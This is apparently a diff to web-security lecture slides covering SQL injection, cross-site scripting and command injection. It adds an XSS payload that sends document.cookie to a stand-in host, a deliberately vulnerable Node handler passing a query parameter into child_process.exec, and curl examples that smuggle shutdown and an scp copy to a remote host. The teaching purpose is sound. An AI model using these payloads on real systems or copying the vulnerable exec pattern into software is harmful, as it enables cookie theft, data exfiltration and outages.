@@ -151,8 +151,8 @@ Vue.directive("highlightjs", {
     <h2>SQL Injection</h2>
     <ul>
       <li>
-        Insertion malicious SQL statements as user-input to attack data-driven
-        applications
+        Insertion of malicious SQL statements as user-input
+        to attack data-driven applications
       </li>
     </ul>
     <div class="diagram-illustration">
@@ -301,25 +301,45 @@ WHERE username = '${this.username}' AND password = '${btoa(this.password)}'
 
 
 <section>
-  <h2>Cross-Site Scripting</h2>
-  <ul style="font-size: 0.8em">
-    <li>
-      attacker attaches code onto a legitimate website that will execute when
-      the victim loads the website
-    </li>
-    <li>
-      helps attacker to steal user cookies to impersonate the user & show popups
-      and Ads
-    </li>
-  </ul>
-  <div class="diagram-illustration">
-    <img
-      class="r-stretch"
-      style="width: 60%"
-      src="https://www.cloudflare.com/img/learning/security/threats/cross-site-scripting/xss-attack.png"
-      alt=""
-    />
-  </div>
+  <section>
+    <h2>Cross-Site Scripting</h2>
+    <ul style="font-size: 0.8em">
+      <li>
+        attacker attaches code onto a legitimate website that will execute when
+        the victim loads the website
+      </li>
+      <li>
+        helps attacker to steal user cookies to impersonate the user & show
+        popups and Ads
+      </li>
+    </ul>
+    <div class="diagram-illustration">
+      <img
+        class="r-stretch"
+        style="width: 60%"
+        src="https://www.cloudflare.com/img/learning/security/threats/cross-site-scripting/xss-attack.png"
+        alt=""
+      />
+    </div>
+  </section>
+  <section>
+    <h2>Example</h2>
+    <div style="font-size: 0.8em">
+      <pre><code class="html" id="imgXssInjection" data-trim contenteditable></code></pre>
+    </div>
+    <div class="diagram-illustration">
+      <img
+        class="r-stretch"
+        style="width: 60%"
+        src="https://i.stack.imgur.com/ASQbz.png"
+        alt=""
+      />
+    </div>
+    <script>
+      const injectScript = `<img src=x onerror=this.src='http://192.168.0.1:80/?'+document.cookie;>`;
+      document.getElementById("imgXssInjection").innerText = injectScript;
+    </script>
+  </section>
 </section>
 
 
@@ -331,26 +351,28 @@ WHERE username = '${this.username}' AND password = '${btoa(this.password)}'
       user input to an interpreter as part of a command or query.
     </li>
   </ul>
-  <div style="font-size: 0.6em; display: grid; grid-template-columns: 60% 40%">
+  <div style="font-size: 0.6em; display: grid; grid-template-columns: 35% 65%">
+    <pre>
+      <code class="js" data-trim contenteditable>
+    ...
+    // check website availability
+    app.get('/', async (req, res) {
+    await child_process.exec(
+    'ping ' + req.query.domain);
+    ...
+    })
+    ...
+      </code>
+    </pre>
     <div>
       <pre>
         <code class="bash">
-curl http://www.ex.com/?file=app.js
-curl http://www.ex.com/?file=;shutdown
-curl http://www.ex.com/?file=;scp%20-r%20.%20root@315.32.2.1:/home
+curl http://www.ping.com/?domain=google.com
+curl http://www.ping.com/?domain=;shutdown
+curl http://www.ping.com/?domain=;scp%20-r%20.%20root@315.32.2.1:/home
         </code>
       </pre>
     </div>
-    <pre>
-      <code class="js" data-trim contenteditable>
-...
-app.get('/', async (req, res) {
-  await child_process.exec(
-    'gzip ' + req.query.file);
-})
-...
-      </code>
-    </pre>
   </div>
 </section>
 
